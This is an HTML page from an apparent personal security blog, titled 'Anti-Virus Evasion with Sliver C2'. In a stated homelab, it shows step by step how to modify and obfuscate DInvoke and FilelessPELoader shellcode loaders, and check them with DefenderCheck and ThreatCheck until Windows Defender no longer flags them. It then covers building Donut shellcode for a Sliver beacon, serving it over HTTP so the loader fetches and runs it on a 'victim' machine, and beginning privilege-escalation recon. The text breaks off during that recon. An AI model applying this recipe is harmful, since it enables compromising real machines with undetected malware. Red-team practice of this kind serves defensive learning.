@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.7.0.799059026210">
+
+    <!-- See retype.com -->
+    <meta name="generator" content="Retype 3.7.0">
+
+    <!-- Primary Meta Tags -->
+    <title>Anti-Virus Evasion with Sliver C2</title>
+    <meta name="title" content="Anti-Virus Evasion with Sliver C2">
+    <meta name="description" content="Recently I have been playing around with Sliver from BishopFox as a C2 framework.">
+
+    <!-- Canonical -->
+    <link rel="canonical" href="https://bytebl33d.github.io/blog/sliver-evasion/">
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://bytebl33d.github.io/blog/sliver-evasion/">
+    <meta property="og:title" content="Anti-Virus Evasion with Sliver C2">
+    <meta property="og:description" content="Recently I have been playing around with Sliver from BishopFox as a C2 framework.">
+    <meta property="og:image" content="https://bytebl33d.github.io/assets/images/headers/sliver-purple.jpg">
+
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://bytebl33d.github.io/blog/sliver-evasion/">
+    <meta property="twitter:title" content="Anti-Virus Evasion with Sliver C2">
+    <meta property="twitter:description" content="Recently I have been playing around with Sliver from BishopFox as a C2 framework.">
+    <meta property="twitter:image" content="https://bytebl33d.github.io/assets/images/headers/sliver-purple.jpg">
+
+    <!-- RSS -->
+    <link rel="alternate" type="application/rss+xml" title="Blog >> Feed" href="https://bytebl33d.github.io/blog/feed.xml">
+
+    <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
+
+    <link href="../../resources/css/retype.css?v=3.7.0.799059026210" rel="stylesheet">
+
+    <script data-cfasync="false" src="../../resources/js/config.js?v=3.7.0.799059026210" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../resources/js/retype.js?v=3.7.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../resources/js/lunr.js?v=3.7.0.799059026210" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../resources/js/prism.js?v=3.7.0.799059026210" defer></script>
+</head>
+<body>
+    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
+        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
+            <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
+                <!-- Mobile menu button skeleton -->
+                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+                <div v-cloak id="docs-sidebar-toggle"></div>
+        
+                <!-- Logo -->
+                <div class="flex items-center justify-between h-full py-2 md:w-75">
+                    <div class="flex items-center px-2 md:px-6">
+                        <a id="docs-site-logo" href="../../" class="flex items-center leading-snug text-2xl">
+                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">bytebl33d</span>
+                        </a><span class="hidden px-2 py-1 ml-4 text-sm font-semibold leading-none text-root-logo-label-text bg-root-logo-label-bg rounded-sm md:inline-block">Blog</span>
+                    </div>
+        
+                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
+                </div>
+        
+                <div class="flex justify-between md:grow">
+                    <!-- Top Nav -->
+                    <nav class="hidden md:flex">
+                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
+                            <li class="mr-6">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="../../blog/">Posts</a>
+                            </li>
+                            <li class="mr-6">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/bytebl33d">GitHub</a>
+                            </li>
+        
+                        </ul>
+                    </nav>
+        
+                    <!-- Header Right Skeleton -->
+                    <div v-cloak class="flex justify-end grow skeleton">
+        
+                        <!-- Search input mock -->
+                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
+                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                            </div>
+                            <input class="w-full h-10 placeholder-gray-400 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 dark:placeholder-dark-400" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
+                        </div>
+        
+                        <!-- Mobile search button -->
+                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                        </div>
+        
+                        <!-- Dark mode switch placeholder -->
+                        <div class="w-10 h-10 lg:ml-2"></div>
+        
+                        <!-- History button -->
+                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
+                        </div>
+                    </div>
+        
+                    <div v-cloak class="flex justify-end grow">
+                        <div id="docs-mobile-search-button"></div>
+                        <doc-search-desktop></doc-search-desktop>
+        
+                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
+                        <doc-history></doc-history>
+                    </div>
+                </div>
+            </div>
+        </header>
+    
+        <div class="relative flex mx-auto bg-white max-w-core">
+            <div class="md:hidden">
+                <!-- Sidebar Skeleton -->
+                <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
+                
+                    <div class="flex items-center h-16 px-6">
+                        <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
+                    </div>
+                
+                    <div class="pl-6 mt-1 mb-4">
+                        <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                        <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                        <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                        <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                        <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                        <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    </div>
+                
+                    <div class="shrink-0 mt-auto bg-transparent dark:border-dark-650">
+                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                            <span class="text-xs whitespace-nowrap">Powered by</span>
+                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+                        </a>
+                    </div>
+                </div>
+                
+                <!-- Sidebar component -->
+                <doc-sidebar v-cloak>
+                    <template #sidebar-footer>
+                        <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
+                
+                            <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
+                                <nav>
+                                    <ul class="flex flex-wrap justify-center items-center">
+                                        <li class="mr-6">
+                                            <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="../../blog/">Posts</a>
+                                        </li>
+                                        <li class="mr-6">
+                                            <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/bytebl33d">GitHub</a>
+                                        </li>
+                
+                                    </ul>
+                                </nav>
+                            </div>
+                
+                            <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                                <span class="text-xs whitespace-nowrap">Powered by</span>
+                                <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+                            </a>
+                        </div>
+                    </template>
+                </doc-sidebar>
+            </div>
+    
+            <div class="grow min-w-0 dark:bg-dark-850">
+                <!-- Render page content -->
+                <div class="grow min-w-0 px-6">
+                    <main class="relative pt-6 pb-16">
+                        <div class="docs-markdown" id="docs-content">
+                            <!-- Rendered if sidebar right is enabled -->
+                            <div id="docs-sidebar-right-toggle"></div>
+                            <!-- Page content  -->
+<doc-anchor-target id="anti-virus-evasion-with-sliver-c2" class="break-words">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#anti-virus-evasion-with-sliver-c2">#</doc-anchor-trigger>
+        <span>Anti-Virus Evasion with Sliver C2</span>
+    </h1>
+</doc-anchor-target>
+<div class="-mt-3 mb-12 flex flex-wrap text-sm text-gray-400 dark:text-dark-350 items-center">
+    <div>In&nbsp;</div>
+    <div><a href="../../categories/maldev/">Maldev</a>,&nbsp;</div>
+    <div><a href="../../categories/windows/">Windows</a>,&nbsp;</div>
+    <div><a href="../../categories/homelab/">Homelab</a></div>
+    <div class="mx-2">&#9679;</div>
+    <div class="flex items-center shrink-0">Published&nbsp;<span>2025-01-04</span></div>
+</div>
+
+<p><figure class="content-center">
+    <img src="../../assets/images/headers/sliver-purple.jpg" alt="">
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Recently I have been playing around with <a href="https://github.com/BishopFox/sliver">Sliver</a> from BishopFox as a C2 framework. After using it for some time and executing several beacon payloads on my Windows VM, I noticed that the beacons instantly get dropped by Windows Defender. In order to improve my Red Teaming skills, I was interested in finding ways to bypass some general anti-virus software like Windows Defender. In this post I will take you through the process of using <a href="https://github.com/Kara-4search/DInvoke_shellcodeload_CSharp/tree/main">DInvoke</a> as a shellcode injecter. I will also showcase how we can make a PE loader to inject code into memory, together with some common obfuscation techniques.</p>
+<doc-anchor-target id="dinvoke-shellcode-loader-net" class="break-words">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#dinvoke-shellcode-loader-net">#</doc-anchor-trigger>
+        <span>DInvoke Shellcode Loader (.NET)</span>
+    </h1>
+</doc-anchor-target>
+<p>In recent years, more and more tools are coded in C# or ported from PowerShell. One of the features of C# is its ability to call the Win32 API and interact with low-level functions just like you would in C or C++.</p>
+<p>To build a shellcode loader, I decided to make use of DInvoke by <a href="https://github.com/TheWover">TheWover</a>. Using DInvoke, we can use Dynamic Invocation to load unmanaged code via DLLs at runtime (unlike PInvoke). This can help us avoiding API Hooking by calling arbitrary code from memory, while also avoiding detections that look for imports of suspicious API calls via the Import Address Table. For more information about the DInvoke project, be sure to read <a href="https://thewover.github.io/Dynamic-Invoke/">TheWover&#x27;s blog post</a> where he demonstrates how the project works.</p>
+<p>In order to make use of DInvoke as a shellcode loader, I made a few modifications to an existing project of <a href="https://github.com/Kara-4search/DInvoke_shellcodeload_CSharp/tree/main">Kara-4search</a>. I changed the original code in order to download my shellcode from a web server and then load it into memory. The applied changes can be seen below.</p>
+<p><figure class="content-center">
+    <img src="../../assets/images/maldev/dinvoke-loader-1.png" alt="DInvoke Loader">
+    <figcaption class="caption">DInvoke Loader</figcaption>
+</figure>
+</p>
+<doc-anchor-target id="obfuscation-with-invisibilitycloak">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#obfuscation-with-invisibilitycloak">#</doc-anchor-trigger>
+        <span>Obfuscation with InvisibilityCloak</span>
+    </h2>
+</doc-anchor-target>
+<p>With our modifications in place, we can save the project and perform some code obfuscation. The <a href="https://github.com/h4wkst3r/InvisibilityCloak">InvisibilityCloak</a> project serves as an easy-to-use obfuscation toolkit that allows for some quick modifications to your project. This includes things like changing the project name, project GUID, applying string obfuscation, removing comments and removing program database (PDB) strings. Just clone the project, compile the binary and run the following command in order to rename the project and apply string reversing as the obfuscation method.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">C:\Tools\Python\InvisibilityCloak&gt; python.exe InvisibilityCloak.py -d C:\Tools\DInvoke_Loader\DInvoke_shellcodeload -n &quot;s3rp3nt&quot; -m reverse
+,                 .     .   .        ,-. .         ,
+|         o     o |   o | o |       /    |         |
+| ;-. . , . ,-. . |-. . | . |-  . . |    | ,-. ,-: | ,
+| | | |/  | `-. | | | | | | |   | | \    | | | | | |&lt;
+' ' ' '   ' `-' ' `-' ' ' ' `-' `-|  `-' ' `-' `-` ' `
+                                        `-'
+====================================================
+[*] INFO: String obfuscation method: reverse
+[*] INFO: Directory of C# project: C:\Tools\DInvoke_Loader\DInvoke_shellcodeload
+[*] INFO: New tool name: s3rp3nt
+====================================================
+
+[*] INFO: Generating new GUID for C# project
+[*] INFO: New project GUID is 1465ec05-f1b9-48e2-af4a-442f974e22a1
+[*] INFO: Changing C# project GUID in below files:
+C:\Tools\DInvoke_Loader\DInvoke_shellcodeload\DInvoke_shellcodeload.sln
+C:\Tools\DInvoke_Loader\DInvoke_shellcodeload\DInvoke_test\DInvoke_shellcodeload.csproj
+C:\Tools\DInvoke_Loader\DInvoke_shellcodeloadDInvoke_test\Properties\AssemblyInfo.cs_copy
+
+
+[*] INFO: Removing PDB string in C# project file
+
+[*] INFO: Renaming DInvoke_shellcodeload.sln to s3rp3nt.sln
+[*] INFO: Renaming DInvoke_shellcodeload.csproj to s3rp3nt.csproj
+[*] INFO: Renaming directory DInvoke_shellcodeload to s3rp3nt
+
+[+] SUCCESS: New GUID of 1465ec05-f1b9-48e2-af4a-442f974e22a1 was generated and replaced in your project
+[+] SUCCESS: New tool name of s3rp3nt was replaced in project
+
+[*] INFO: Performing reverse obfuscation on strings in C:\Tools\DInvoke_Loader\DInvoke_shellcodeload\DInvokeFunctions.cs
+[*] INFO: Performing reverse obfuscation on strings in C:\Tools\DInvoke_Loader\DInvoke_shellcodeload\DInvoke_test\DELEGATES.cs
+[*] INFO: Performing reverse obfuscation on strings in C:\Tools\DInvoke_Loader\DInvoke_shellcodeload\DInvoke_test\DInvokeFunctions.cs
+[*] INFO: Performing reverse obfuscation on strings in C:\Tools\DInvoke_Loader\DInvoke_shellcodeload\DInvoke_test\Program.cs
+[*] INFO: Performing reverse obfuscation on strings in C:\Tools\DInvoke_Loader\DInvoke_shellcodeload\DInvoke_test\obj\x64\Debug\.NETFramework,Version=v4.7.2.AssemblyAttributes.cs
+[*] INFO: Performing reverse obfuscation on strings in C:\Tools\DInvoke_Loader\DInvoke_shellcodeload\DInvoke_test\obj\x64\Release\.NETFramework,Version=v4.7.2.AssemblyAttributes.cs
+[*] INFO: Performing reverse obfuscation on strings in C:\Tools\DInvoke_Loader\DInvoke_shellcodeload\DInvoke_test\obj\x86\Debug\.NETFramework,Version=v4.7.2.AssemblyAttributes.cs
+
+[+] SUCCESS: Your new tool s3rp3nt now has the invisibility cloak applied.</code></pre>
+</doc-codeblock></div>
+<p>From the output we see that we have succesfully obfuscated the project. Before compiling, let&#x27;s change all string references to DInvoke to another custom string (e.g. &quot;s3rp3nt&quot;). We will also change the project output type to be a Windows Application in order to avoid a console pop-up when executing the binary.</p>
+<p><figure class="content-center">
+    <img src="../../assets/images/maldev/dinvoke-loader-2.png" alt="DInvoke loader">
+    <figcaption class="caption">DInvoke loader</figcaption>
+</figure>
+</p>
+<p>We can now compile the project to x64 architecture in release mode by going to <code v-pre>Build &gt; Build Solution</code>.</p>
+<doc-anchor-target id="av-check">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#av-check">#</doc-anchor-trigger>
+        <span>AV Check</span>
+    </h2>
+</doc-anchor-target>
+<p>With our loader ready, we can verify if our file is not getting detected as malicious by running <a href="https://github.com/rasta-mouse/ThreatCheck">ThreatCheck</a> or <a href="https://github.com/matterpreter/DefenderCheck">DefenderCheck</a>.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">C:\Tools&gt; DefenderCheck.exe s3rp3ntLoader.exe
+Target file size: 8192 bytes
+Analyzing...
+
+Exhausted the search. The binary looks good to go!
+
+C:\Tools\ThreatCheck\bin\Release&gt; ThreatCheck.exe -f C:\Tools\s3rp3ntLoader.exe
+[+] No threat found!</code></pre>
+</doc-codeblock></div>
+<p>No threats have been found!</p>
+<doc-anchor-target id="filelesspeloader-c">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#filelesspeloader-c">#</doc-anchor-trigger>
+        <span>FilelessPELoader (C++)</span>
+    </h1>
+</doc-anchor-target>
+<p>One downside of using DInvoke is that it requires .NET to be installed on the host to be able to execute our loader because of the CLR. This means that we need to write our application in another language like C++. At this point I don&#x27;t feel like rewriting the whole project in C++ so I will make use of another way.</p>
+<p>Another technique that can be used is to load an encrypted version of our shellcode in memory, decrypt it and execute it. To do this, we can make use of the <a href="https://github.com/SaadAhla/FilelessPELoader">FilelessPELoader</a> project and again do some obfuscation on the original code. Since this is not a C# project, we cannot use InvisibilityCloak to do the obfuscation, so we will do it manually this time. Again we can use either DefenderCheck or ThreatCheck to see if our executable is good to go. Let&#x27;s first clone the project and compile our binary without any modifications.</p>
+<p><figure class="content-center">
+    <img src="../../assets/images/maldev/filelesspeloader-1.png" alt="FilelessPELoader">
+    <figcaption class="caption">FilelessPELoader</figcaption>
+</figure>
+</p>
+<p>From the above output, we can see that ThreatCheck has identified some bad bytes that will be detected by AV. To fix this I removed all comments, any unnecessary print statements or functions, and reversed several function names. I am not going into detail on how to obfuscate the code, since it should be relatively easy to bypass any signature checks.</p>
+<p><figure class="content-center">
+    <img src="../../assets/images/maldev/filelesspeloader-2.png" alt="FilelessPELoader">
+    <figcaption class="caption">FilelessPELoader</figcaption>
+</figure>
+</p>
+<p>The project comes with a custom <code v-pre>aes.py</code> script that can be used to encrypt any file we want. The idea is that our loader will fetch the encrypted binary (<code v-pre>cipher.bin</code>) together with a key (<code v-pre>key.bin</code>) in order to decrypt it.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">$ python3 aes.py malicious_file.exe
+$ ls
+aes.py cipher.bin key.bin malicious_file.exe</code></pre>
+</doc-codeblock></div>
+<p>The generated files <code v-pre>cipher.bin</code> and <code v-pre>key.bin</code> can be passed to our loader as arguments. In the next section we will have a look at how we can make use of our loaders.</p>
+<doc-anchor-target id="sliver-in-action">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#sliver-in-action">#</doc-anchor-trigger>
+        <span>Sliver in Action</span>
+    </h1>
+</doc-anchor-target>
+<doc-anchor-target id="shellcode-generation">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#shellcode-generation">#</doc-anchor-trigger>
+        <span>Shellcode Generation</span>
+    </h2>
+</doc-anchor-target>
+<p>Moving to our attack machine, we will create shellcode for a Sliver beacon. Start Sliver, generate a mTLS beacon targeting your IP and save it to a directory of your choosing. Next we start the mTLS listener.</p>
+<p><figure class="content-center">
+    <img src="../../assets/images/maldev/sliver-setup.png" alt="Sliver Setup">
+    <figcaption class="caption">Sliver Setup</figcaption>
+</figure>
+</p>
+<p>In order to better evade detection, we now convert the executable to a <code v-pre>.bin</code> file with <a href="https://github.com/TheWover/donut">Donut</a>. Donut is a tool focused on creating binary shellcodes that can be executed in memory. It will generate a shellcode of a .NET binary, which can be executed via the execute-shellcode argument in Sliver. I&#x27;ll use Donut with the <code v-pre>-b 1</code> flag to not add AMSI bypass and the <code v-pre>-e 3</code> flag for encryption.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">$ ./donut -b 1 -e 3 -o rev.bin -i /tmp/ESSENTIAL_THEATER.exe 
+
+  [ Donut shellcode generator v1 (built Dec 26 2024 11:15:37)
+  [ Copyright (c) 2019-2021 TheWover, Odzhan
+
+  [ Instance type : Embedded
+  [ Module file   : &quot;/tmp/ESSENTIAL_THEATER.exe&quot;
+  [ Entropy       : Random names + Encryption
+  [ File type     : EXE
+  [ Target CPU    : x86+amd64
+  [ AMSI/WDLP/ETW : none
+  [ PE Headers    : overwrite
+  [ Shellcode     : &quot;rev.bin&quot;
+  [ Exit          : Thread</code></pre>
+</doc-codeblock></div>
+<p>Lets copy all files to the <code v-pre>/tmp</code> directory and run our Python HTTP server.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">$ cp rev.bin /tmp/rev.bin
+$ python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="payload-execution">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#payload-execution">#</doc-anchor-trigger>
+        <span>Payload Execution</span>
+    </h2>
+</doc-anchor-target>
+<p>Now with everything set lets try to get a beacon from our victim machine (<code v-pre>172.16.0.5</code>).</p>
+<p><figure class="content-center">
+    <img src="../../assets/images/maldev/sliver-execution.png" alt="Sliver Execution">
+    <figcaption class="caption">Sliver Execution</figcaption>
+</figure>
+</p>
+<p>After executing our custom shellcode loader, we can see it has grabbed our beacon from our Python server, loaded our shellcode in memory and we received a connection from our server without alerting Windows Defender. You see that I get a couple of beacon connections, because I rand the executable a couple of times.</p>
+<p>Now we can also try running our modified FilelessPELoader executable.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">$ python3 aes.py beacon.exe
+$ python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...</code></pre>
+</doc-codeblock></div>
+<p><figure class="content-center">
+    <img src="../../assets/images/maldev/sliver-filelesspeloader.png" alt="Sliver FilelessPELoader">
+    <figcaption class="caption">Sliver FilelessPELoader</figcaption>
+</figure>
+</p>
+<p>We can now even go a step further and escalate privileges on the victim.</p>
+<doc-anchor-target id="privilege-escalation">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#privilege-escalation">#</doc-anchor-trigger>
+        <span>Privilege Escalation</span>
+    </h2>
+</doc-anchor-target>
+<p>Use one of the beacons and run <code v-pre>sa-whoami</code>. This will run a <code v-pre>whoami /all</code> in a more safe way.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">[server] sliver (ESSENTIAL_THEATER) &gt; sa-whoami 
+
+[*] Tasked beacon ESSENTIAL_THEATER (f91cc40c)
+
+[+] ESSENTIAL_THEATER completed task f91cc40c
+
+[*] Successfully executed sa-whoami (coff-loader)
+[*] Got output:
+
+UserName        SID
+====================== ====================================
+DESKTOP-3GMRMMT\John    S-1-5-21-2723216276-469661999-718104327-1001
+
+
+GROUP INFORMATION                                 Type                     SID                                          Attributes               
+================================================= ===================== ============================================= ==================================================
+DESKTOP-3GMRMMT\None                              Group                    S-1-5-21-2723216276-469661999-718104327-513   Mandatory group, Enabled by default, Enabled group, 
+Everyone                                          Well-known group         S-1-1-0                                       Mandatory group, Enabled by default, Enabled group, 
+NT AUTHORITY\Local account and member of Administrators groupWell-known group         S-1-5-114                                     
+DESKTOP-3GMRMMT\docker-users                      Alias                    S-1-5-21-2723216276-469661999-718104327-1002  Mandatory group, Enabled by default, Enabled group, 
+BUILTIN\Administrators                            Alias                    S-1-5-32-544                                  
+BUILTIN\Performance Log Users                     Alias                    S-1-5-32-559                                  Mandatory group, Enabled by default, Enabled group, 
